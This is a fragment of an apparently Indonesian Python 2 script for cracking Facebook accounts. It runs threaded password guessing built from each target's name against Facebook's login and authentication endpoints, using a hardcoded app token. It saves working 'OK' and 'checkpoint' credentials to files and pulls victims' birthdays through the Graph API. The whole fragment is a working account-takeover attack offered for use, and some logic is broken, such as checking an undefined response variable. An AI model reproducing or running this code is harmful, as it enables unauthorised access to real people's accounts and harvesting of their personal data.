                'user-agent': uas, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
                respon = requests.get(url,params=param, headers=kontol)
                if "free_logout_button" in respon.text:
                    print'\r\x1b[0;92m [OK] ' + uid + ' | ' + pw + '                                            '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [OK] ' + str(uid) + ' | ' + str(pw) +                                   '\n')
                    save.close()
                    break
                    continue
                    continue
                if "checkpoint" in respon.text:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b["birthday"]
                        month, day, year = graph.split("/")
                        month = bulan[month]
                        print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + ' | ' + pw + ' | ' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write('  * --> ' + str(uid) + '|' + str(pw) + ' | ' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        graph = " "
                    except:pass
                    print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '                        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    exit()
    
def mfb():
    uas = 'ua'
    print'\n [+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [+] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] anda bisa menjeda proses crack dengan mematikan data seluler")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[1;97m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass
            
        try:
            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123']:
                ses = requests.Session()
                ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                p = ses.get("https://mbasic.facebook.com")
                b = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
                if "c_user" in r.cookies.get_dict().keys():
                    print'\r\x1b[0;92m [OK] ' + uid + ' | ' + pw + '                                            '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [OK] ' + str(uid) + ' | ' + str(pw) +                                   '\n')
                    save.close()
                    break
                    continue
                    continue
                if "checkpoint" in r.cookies.get_dict().keys():
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b["birthday"]
                        month, day, year = graph.split("/")
                        month = bulan[month]
                        print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + ' | ' + pw + ' | ' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write('  * --> ' + str(uid) + '|' + str(pw) + ' | ' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        graph = " "
                    except:pass
                    print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '                        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    exit()
	
		
if __name__ == '__main__':
    os.system('clear')
    print logo
    tokenz()